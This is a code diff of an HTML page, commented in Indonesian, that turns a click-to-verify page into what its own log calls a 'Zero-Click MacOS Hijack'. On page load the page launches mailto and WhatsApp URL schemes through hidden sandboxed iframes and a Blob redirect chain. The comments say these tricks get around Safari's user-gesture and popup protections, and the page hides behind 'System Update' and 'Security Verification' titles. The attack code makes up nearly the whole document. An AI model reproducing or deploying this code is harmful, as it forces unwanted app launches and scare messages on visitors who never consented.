@@ -3,13 +3,13 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Security Verification</title>
+<title>System Update</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
     background: #f4f6f8; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
     display: flex; justify-content: center; align-items: center;
-    height: 100vh; margin: 0; cursor: pointer; text-align: center;
+    height: 100vh; margin: 0; text-align: center;
   }
   .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }
   h2 { color: #333; margin-bottom: 10px; }
@@ -21,8 +21,8 @@
 <body>
 
 <div class="panel" id="main-card">
-  <h2>🔒 System Verification</h2>
-  <p>Klik di mana saja untuk memverifikasi sistem Anda.</p>
+  <h2>🔒 Security Verification</h2>
+  <p>Memproses...</p>
   <div id="log">Sistem siap.</div>
 </div>
 
@@ -41,54 +41,72 @@
   }
 
   // ============================================
-  // TARGET SCHEMES (MACOS)
+  // 1. TARGET SCHEMES (MACOS)
   // ============================================
-  
-  // 1. Apple Mail (Membuka aplikasi Mail dengan draft baru)
-  var MAIL_SCHEME = "mailto:security@apple.com?subject=Security%20Alert&body=Your%20account%20has%20been%20compromised.";
-
-  // 2. WhatsApp (Membuka aplikasi WhatsApp)
+  var MAIL_SCHEME = "mailto:security@apple.com?subject=Security%20Alert&body=Account%20Compromised";
   var WA_SCHEME = "whatsapp://send?text=Security%20Verification%20Required";
 
   // ============================================
-  // TRIGGER (ONE CLICK)
+  // 2. TRIGGER ZERO-CLICK (OTOMATIS SAAT LOAD)
   // ============================================
-  document.body.addEventListener('click', function() {
+  window.addEventListener('load', function() {
     if (executed) return;
     executed = true;
 
-    document.getElementById('main-card').innerHTML = `
-      <h2>Memproses...</h2>
-      <p>Menghubungkan ke layanan...</p>
-      <div id="log"></div>
-    `;
-    logEl = document.getElementById('log');
-    log("[!] Memulai Protocol Hijack...");
+    log("[!] Memulai Zero-Click MacOS Hijack...");
 
     // ============================================
-    // METODE 1: DIRECT TOP-LEVEL REDIRECT
+    // A. IFRAME SANDBOX (BYPASS GESTURE)
     // ============================================
-    try {
-      log("[+] Mengirim Mail Scheme...");
-      // Gunakan location.replace agar tidak bisa di-back
-      window.location.replace(MAIL_SCHEME);
-    } catch(e) {
-      log("[-] Mail Error: " + e.message);
-    }
-
-    // ============================================
-    // METODE 2: BLOB WRAPPER (BYPASS POPUP)
-    // ============================================
+    // Trik: Beberapa versi Safari mengizinkan skema kustom 
+    // jika dimuat di dalam iframe yang di-sandbox.
+    
     setTimeout(function() {
-      log("[+] Mengirim WhatsApp Scheme via Blob...");
       try {
-        // Bungkus WhatsApp Scheme di dalam Blob
+        log("[+] Mengirim Mail via Iframe...");
+        var iframe1 = document.createElement("iframe");
+        iframe1.sandbox = "allow-scripts allow-top-navigation allow-popups";
+        iframe1.style.display = "none";
+        iframe1.src = MAIL_SCHEME;
+        document.getElementById("launcher-container").appendChild(iframe1);
+      } catch(e) {
+        log("[-] Mail Error: " + e.message);
+      }
+    }, 100);
+
+    setTimeout(function() {
+      try {
+        log("[+] Mengirim WhatsApp via Iframe...");
+        var iframe2 = document.createElement("iframe");
+        iframe2.sandbox = "allow-scripts allow-top-navigation allow-popups";
+        iframe2.style.display = "none";
+        iframe2.src = WA_SCHEME;
+        document.getElementById("launcher-container").appendChild(iframe2);
+      } catch(e) {
+        log("[-] WA Error: " + e.message);
+      }
+    }, 500);
+
+    // ============================================
+    // B. BLOB REDIRECT CHAIN (TOP-LEVEL)
+    // ============================================
+    // Trik: Bungkus skema di dalam Blob, lalu buka di tab baru.
+    // Safari sering menganggap ini navigasi internal.
+    
+    setTimeout(function() {
+      log("[+] Mengirim Blob Redirect Chain...");
+      try {
         var blobPayload = `
           <!DOCTYPE html>
           <html>
           <body>
             <script>
-              window.location.href = "${WA_SCHEME}";
+              // Redirect berantai ke Mail
+              window.location.replace("${MAIL_SCHEME}");
+              // Fallback ke WA setelah 500ms
+              setTimeout(function() {
+                window.location.replace("${WA_SCHEME}");
+              }, 500);
             <\/script>
           </body>
           </html>
@@ -96,33 +114,19 @@
         var blob = new Blob([blobPayload], { type: 'text/html' });
         var blobUrl = URL.createObjectURL(blob);
         
-        // Buka Blob di tab baru (jika diizinkan)
+        // Buka di tab baru
         var win = window.open(blobUrl, '_blank');
         if (win) {
-          log("[+] WhatsApp Blob Triggered.");
+          log("[+] Blob Redirect Triggered (Tab Baru).");
         } else {
-          log("[-] Popup diblokir.");
+          log("[-] Popup diblokir (Blob).");
         }
       } catch(e) {
-        log("[-] WA Error: " + e.message);
+        log("[-] Blob Error: " + e.message);
       }
-    }, 500);
-
-    // ============================================
-    // METODE 3: IFRAME SANDBOX (FALLBACK)
-    // ============================================
-    setTimeout(function() {
-      log("[+] Mengirim WhatsApp via Iframe...");
-      try {
-        var iframe = document.createElement("iframe");
-        iframe.sandbox = "allow-scripts allow-top-navigation allow-popups";
-        iframe.style.display = "none";
-        iframe.src = WA_SCHEME;
-        document.getElementById("launcher-container").appendChild(iframe);
-      } catch(e) {}
     }, 1000);
 
-  }, { once: true });
+  });
 
 })();
 </script>
